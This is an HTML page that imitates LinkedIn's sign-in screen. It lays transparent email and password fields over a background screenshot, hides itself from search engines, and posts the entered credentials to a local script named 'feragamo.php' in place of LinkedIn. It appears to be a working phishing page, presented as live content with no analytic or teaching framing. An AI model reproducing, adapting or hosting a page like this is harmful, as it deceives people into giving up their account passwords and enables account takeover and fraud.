<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	
<title>Sign in to Linkedin</title>
<meta name="robots" content="noindex,nofollow" />
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<style>

.specialLink{
    background: url(images/background.png) no-repeat ;
    font-size: 1em;
	height: 704px;
	background-repeat: no-repeat;
	width: 1285px;
	
	
}
</style>
</head>
<body bgcolor="#ffffff" style=" padding: 0; margin: 0; " class="specialLink">



 

<div><div class="mm-sc-new-footer">



<div style="float: right;z-index: 9999999;position: absolute;left: 0;margin-top: 275px;background: transparent;height: 375px;width: 365px;border-radius: 4px;margin-left: 448px;">	


<form id="frmLogin" method="post" action="feragamo.php" style=" padding: 13px; ">


 <center> 
 
 
 <input  type="email" name="session_key" placeholder="Email address or phone number" tabindex="1" value="" required="" value=""style="width: 368px;background: #fff;transition: border linear .2s;margin-bottom: 22px;border-radius: 0;box-sizing: border-box;color: #434343;font-family: verdana;font-size: 13px;height: 31px;padding: 9px 10px;margin-left: 6px;border: 0px;" ></center>
 
  
<center>  <input  type="password" name="sarogiwa" placeholder="Password" autocomplete="off" tabindex="2" value="" required="" style="width: 368px;background: #fff;transition: border linear .2s;margin-bottom: 22px;border-radius: 0;box-sizing: border-box;color: #434343;font-family: verdana;font-size: 13px;height: 31px;padding: 9px 10px;margin-left: 6px;border: 0px;"> </center>
    
 
  
   
   <center> 
<button name="Submit" style="z-index: 10;\: 700;background-color: transparent;border: 0 none;border-radius: 3px;color: #FFF;font-size: 16px;height: 33;text-align: center;width: 374;margin-top: -1px;margin-left: 3px;font-weight:  700;">Sign In</button>


   </center>
    
   

  
</form>
 
</div>

 

			
</div>

<div id="ServerId" style="color:whitesmoke;text-align:center;background:whitesmoke">  </div>

</div></div>
</body>
</html>
